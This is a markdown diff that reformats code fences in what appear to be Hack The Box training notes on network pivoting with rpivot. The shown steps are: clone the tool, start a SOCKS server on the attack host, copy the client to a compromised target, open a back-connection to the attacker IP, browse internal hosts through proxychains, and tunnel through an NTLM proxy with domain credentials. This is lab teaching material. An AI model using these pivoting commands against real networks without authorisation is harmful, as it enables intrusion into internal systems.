@@ -10,8 +10,7 @@ We can start our rpivot SOCKS proxy server using the below command to allow the 
 
 #### Cloning rpivot
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
 ```
 
@@ -19,8 +18,7 @@ We can start our rpivot SOCKS proxy server to connect to our client on the compr
 
 #### Running server.py from the Attack Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 ```
 
@@ -28,15 +26,13 @@ Before running `client.py` we will need to transfer rpivot to the target. We can
 
 #### Transferring rpivot to the Target
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
 ```
 
 #### Running client.py from Pivot Target
 
-```
-        shellsession
+```shellsession
 ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999
 
 Backconnecting to server 10.10.14.18 port 9999
@@ -44,8 +40,7 @@ Backconnecting to server 10.10.14.18 port 9999
 
 #### Confirming Connection is Established
 
-```
-        shellsession
+```shellsession
 New connection from host 10.129.202.64, source port 35226
 ```
 
@@ -55,8 +50,7 @@ Finally, we should be able to access the webserver on our server-side, which is 
 
 #### Browsing to the Target Webserver using Proxychains
 
-```
-        shellsession
+```shellsession
 proxychains firefox-esr 172.16.5.135:80
 ```
 
@@ -66,7 +60,6 @@ Similar to the pivot proxy above, there could be scenarios when we cannot direct
 
 #### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
 
-```
-        shellsession
+```shellsession
 python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 ```
